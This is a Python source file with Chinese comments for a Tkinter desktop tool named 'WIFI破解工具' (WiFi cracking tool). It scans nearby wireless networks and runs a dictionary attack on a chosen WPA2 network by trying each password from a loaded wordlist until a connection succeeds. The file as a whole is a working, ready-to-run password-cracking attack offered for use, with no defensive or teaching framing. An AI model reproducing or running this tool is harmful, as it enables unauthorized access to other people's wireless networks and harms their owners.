#!/usr/bin/env python

from tkinter import *
from tkinter import ttk
import pywifi
from pywifi import const
import time
import tkinter.filedialog
import tkinter.messagebox
import threading

# 当前版本存在的问题：
# 无法破解带有特殊字符的wifi 如 希腊字母、日语等，还有 < > 这种符号

# 创建一个类，继承自listbox，写一个同时执行插入和查看最后一行的操作
class Log_Listbox(Listbox):
    def insert_and_see(self, message):
        self.insert(END, message)
        self.see(END)

class MY_GUI():
    def __init__(self, myWindow:Tk):
        self.myWindow = myWindow
        self.wifi = pywifi.PyWiFi()  # 抓取网卡接口
        self.iface = self.wifi.interfaces()[0]  # 抓取第一个无线网卡

        # GUI元素
        self.get_wifi_value = StringVar(value='搜索后双击 wifi 以填充')     # wifi名
        self.get_value = StringVar()                                      # 文件路径
        self.get_wifipwd_value = StringVar()                              # 正确密码
        self.mylog = None
        self.waitime = IntVar(value=5)

    def set_init_window(self):
        # ********* 窗口配置 ********
        self.myWindow.title("WIFI破解工具")
        w, h = self.myWindow.maxsize()
        self.myWindow.geometry(f'550x630+{(w - 550)//2}+{(h - 750)//2}')

        # *********** wifi展示列 *********
        self.wifi_labelframe = LabelFrame(self.myWindow, text="wifi列表")
        self.wifi_labelframe.grid(column=0, row=0, columnspan=4, sticky=(W, E, N, S), padx=10, pady=5)

        self.wifi_tree = ttk.Treeview(self.wifi_labelframe, show="headings", columns=("a", "b", "c", "d"))
        self.vbar = ttk.Scrollbar(self.wifi_labelframe, orient=VERTICAL, command=self.wifi_tree.yview)
        self.wifi_tree.configure(yscrollcommand=self.vbar.set)

        self.wifi_tree.column("a", width=50, anchor="center")
        self.wifi_tree.column("b", width=200, anchor="center")
        self.wifi_tree.column("c", width=200, anchor="center")
        self.wifi_tree.column("d", width=50, anchor="center")

        self.wifi_tree.heading("a", text="WiFiID")
        self.wifi_tree.heading("b", text="SSID")
        self.wifi_tree.heading("c", text="BSSID")
        self.wifi_tree.heading("d", text="Signal")

        self.wifi_tree.grid(row=0, column=0, sticky=(W, E, N, S))
        self.vbar.grid(row=0, column=1, sticky=(N, S))
        self.wifi_labelframe.grid_columnconfigure(0, weight=1)
        self.wifi_labelframe.grid_rowconfigure(0, weight=1)

        self.wifi_tree.bind("<Double-1>", self.onDBClick)
        
        # ************* 配置区域 ***************
        labelframe = LabelFrame(self.myWindow, text="配置")
        labelframe.grid(column=0, row=1, padx=10, pady=5, sticky=(W, E, N, S))

        Label(labelframe, text="WIFI帐号: ").grid(column=0, row=0, sticky=W)
        Entry(labelframe, textvariable=self.get_wifi_value, width=22).grid(column=1, row=0, sticky=W)
        Button(labelframe, text="搜索附近WiFi", command=lambda:self.work_in_back(self.scans_wifi_list)).grid(column=2, row=0, padx=10, pady=5, sticky=W)
        Button(labelframe, text="开始破解", command=lambda:self.work_in_back(self.startCrack)).grid(column=3, row=0, sticky=W, padx=50)

        Label(labelframe, text="文件路径：").grid(column=0, row=1, sticky=W)
        Entry(labelframe, width=22, textvariable=self.get_value).grid(column=1, row=1, sticky=W)
        Button(labelframe, text="添加密码文件", command=lambda:self.work_in_back(self.add_pwd_file)).grid(column=2, row=1, sticky=W, padx=10, pady=5)

        Label(labelframe, text="WIFI密码: ").grid(column=0, row=2, sticky=W)
        Entry(labelframe, width=22, textvariable=self.get_wifipwd_value).grid(column=1, row=2, sticky=W, padx=1, pady=5)
        Button(labelframe, text='测试连接', command=lambda:self.work_in_back(self.testConnect)).grid(column=2, row=2, sticky=W, pady=5, padx=10)
        Label(labelframe, text='可以尝试输入密码测试连接热点的速度, 并适当调整连接等待时间', font=('',9), fg='red').place(x=0, y=120)

        Label(labelframe, text='连接等待时长: ').grid(column=0, row=3, pady=24)
        Entry(labelframe, width=22, textvariable=self.waitime).grid(column=1, row=3)

        Label(labelframe, text='在一定范围内，等待时间越长, 连接上的机会越大.', font=('', 9), fg='red').place(x=0, y=170)

        # ********* 运行日志 **********
        listframe = LabelFrame(self.myWindow, text='运行日志')
        listframe.grid(column=0, row=2, padx=10, pady=5, sticky=(W, E, N, S))

        self.mylog = Log_Listbox(listframe, width=70, height=6)
        self.mylog.grid(column=0, row=0, padx=3, pady=3, sticky=W)
        vbar = ttk.Scrollbar(listframe, orient=VERTICAL, command=self.mylog.yview)
        vbar.grid(row=0, column=1, sticky=(N, S))

    # 创建子线程后台运行，需要使用 lambda 延迟该函数执行
    def work_in_back(self, func, *args):
        # 设置保护线程，程序关闭时同时关闭所有子线程
        threading.Thread(target=func, args=args, daemon=True).start()  
        
    def scans_wifi_list(self):
        self.iface.disconnect()  # 测试链接断开所有链接
        time.sleep(1)  # 休眠1秒

        self.iface.scan()
        time.sleep(1)  # 适当调整等待时间
        scanres = self.iface.scan_results()
        self.show_scans_wifi_list(scanres)

    def show_scans_wifi_list(self, scans_res):
        # 清空原有结果
        for i in self.wifi_tree.get_children():
            self.wifi_tree.delete(i)
        # 插入新的结果
        for index, wifi_info in enumerate(scans_res):
            # ssid = wifi_info.ssid.encode('raw_unicode_escape').decode('utf-8')
            ssid = wifi_info.ssid
            self.wifi_tree.insert("", 'end', values=(index + 1, ssid, wifi_info.bssid, wifi_info.signal))
        self.mylog.insert_and_see(f"搜索完成.")

    def add_pwd_file(self):
        filename = tkinter.filedialog.askopenfilename()
        if filename:
            self.get_value.set(filename)
            self.mylog.insert_and_see(f"已加载文件 {filename}.")

    def onDBClick(self, event):
        for item in self.wifi_tree.selection():
            item_text = self.wifi_tree.item(item, "values")
            self.get_wifi_value.set(item_text[1])  # 填充选中的WiFi账号
            self.mylog.insert_and_see(f"已选择wifi {item_text[1]}")

    def testConnect(self):
        self.iface.disconnect()  # 测试链接断开所有链接
        
        wifi_ssid = self.get_wifi_value.get()
        wifi_pwd = self.get_wifipwd_value.get()
        if not wifi_ssid:
            tkinter.messagebox.showinfo('提示', '请选择对应wifi!')
            return
        elif not wifi_pwd:
            tkinter.messagebox.showinfo('提示', '尚未输入密码')
            return
        
        self.mylog.insert_and_see(f"正在尝试密码 {wifi_pwd}...")
        import time
        start = time.time()
        if self.connect(wifi_pwd, wifi_ssid):
            end = time.time()
            self.mylog.insert_and_see(f'连接成功. 耗时{end - start}s')
            self.waitime.set(int(end - start) + 1)
        else:
            self.mylog.insert_and_see('连接失败, 请检查密码是否正确.')
        
    def startCrack(self):
        filePath = self.get_value.get()
        wifi_ssid = self.get_wifi_value.get()
        if not wifi_ssid:
            tkinter.messagebox.showinfo('提示', '请选择对应wifi!')
            return
        elif not filePath:
            tkinter.messagebox.showinfo('提示', '请选择密码文件!')
            return
        
        try:
            import chardet
            # 检测文件编码
            with open(filePath, 'rb') as file:
                raw_data = file.read()
                result = chardet.detect(raw_data)
                encoding = result['encoding']

            with open(filePath, "r", errors="ignore", encoding=encoding) as pwd_file:
                for pwd in pwd_file:
                    self.mylog.insert_and_see(f"正在尝试密码 {pwd.strip()}...")
                    if self.connect(pwd.strip(), wifi_ssid, crack=True):
                        self.get_wifipwd_value.set(pwd.strip())
                        self.mylog.insert_and_see(f'破解成功，密码：{pwd.strip()}')
                        self.mylog.insert_and_see(f"正确密码已写入输入框, 有需要可复制.")
                        tkinter.messagebox.showinfo('提示', f"密码 : {pwd.strip()}")
                        return
                self.mylog.insert_and_see('破解失败，尝试所有密码均不匹配！')
                tkinter.messagebox.showinfo('提示', '破解失败，尝试所有密码均不匹配！')
        except Exception as e:
            self.mylog.insert_and_see(e)

    def connect(self, pwd_str, wifi_ssid, crack=False):
        profile = pywifi.Profile()
        profile.ssid = wifi_ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm = const.AKM_TYPE_WPA2PSK
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = pwd_str
        self.iface.remove_all_network_profiles()
        tmp_profile = self.iface.add_network_profile(profile)
        self.iface.connect(tmp_profile)
        # 破解模式
        if crack:
            waitime = self.waitime.get()
            if waitime:
                time.sleep(waitime)  
            else:
                time.sleep(5)   # 默认等待5秒，以便连接稳定

            if self.iface.status() == const.IFACE_CONNECTED:
                return True
            else:
                self.mylog.insert_and_see(f"连接失败, 正在断开连接...")
                self.iface.disconnect()
                time.sleep(0.1)
                return False
        # 测试模式
        else:
            start = time.time()
            # 设置超时时间为 10 s ，一直等待到连接成功为止
            while time.time() - start < 10 and self.iface.status() != const.IFACE_CONNECTED:
                time.sleep(0.1)
            if self.iface.status() == const.IFACE_CONNECTED:
                time.sleep(2)   # 一般在连接成功后的两秒内会保持稳定连接或断开连接
                return True


def gui_start():
    init_window = Tk()
    ZH_WIFI_GUI = MY_GUI(init_window)
    ZH_WIFI_GUI.set_init_window()
    init_window.mainloop()


if __name__ == '__main__':
    gui_start()
